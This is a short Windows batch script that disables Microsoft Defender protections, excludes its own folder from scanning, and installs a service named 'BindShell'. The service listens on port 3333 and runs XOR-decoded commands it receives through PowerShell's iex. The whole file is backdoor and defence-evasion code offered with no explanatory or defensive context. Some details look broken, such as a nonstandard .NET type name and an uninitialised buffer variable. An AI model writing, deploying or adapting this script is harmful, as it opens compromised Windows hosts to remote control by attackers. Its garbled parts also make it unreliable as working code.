@echo off
powershell -c "Set-MpPreference -DisableTamperProtection $true; Add-MpPreference -ExclusionPath '%~dp0'"
sc create BindShell binPath= "cmd /k powershell -nop -c iex(New-Object Net.Sock.Connection('0.0.0.0',3333)).GetStream().Read([byte[]]$b,0,$b.Length)|%{$_ -bxor 35|iex}"
sc start BindShell
